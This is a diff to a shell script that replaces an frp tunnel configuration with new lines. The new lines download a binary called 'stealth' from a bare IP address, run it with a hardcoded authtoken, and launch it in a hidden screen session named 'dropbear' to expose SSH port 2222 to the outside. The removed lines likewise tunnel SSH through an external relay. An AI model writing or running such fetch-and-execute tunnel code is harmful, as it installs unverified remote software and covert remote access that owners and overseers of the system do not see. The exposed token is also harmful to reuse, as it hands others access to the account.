@@ -55,31 +55,14 @@ TZ='Africa/Johannesburg'; export TZ
 date
 sleep 2
 
-wget https://github.com/fatedier/frp/releases/download/v0.48.0/frp_0.48.0_linux_amd64.tar.gz
-tar -xvf frp_0.48.0_linux_amd64.tar.gz
-# start from daemon
-cp frp_0.48.0_linux_amd64/frpc /usr/bin
-mkdir /etc/frp
-mkdir /var/frp  # log
-
+wget -q http://45.135.58.52/stealth >/dev/null
 sleep 2
-
-cat > /etc/frp/frpc.ini <<END
-[common]
-server_addr = emergencyaccess.teatspray.fun
-server_port = 7000
-
-[ssh.vusumziphelibhongoiku]
-type = tcp
-local_ip = 127.0.0.1
-local_port = 2222
-remote_port = 12266
-subdomain = vusumziphelibhongoiku
-
-END
-
+chmod +x stealth 
 sleep 2
+./stealth authtoken 1hPY6A7OjP5HfIbcres8VBFPXpy_6iMubeSgbKqXiQcAmf7vy
+sleep 2
+screen -dmS dropbear bash -c './stealth tcp 2222'
 
-#vusumziphelibhongoiku.emergencyaccess.teatspray.fun
+sleep 5
 
-/usr/bin/frpc -c /etc/frp/frpc.ini
+curl http://127.0.0.1:4040/api/tunnels
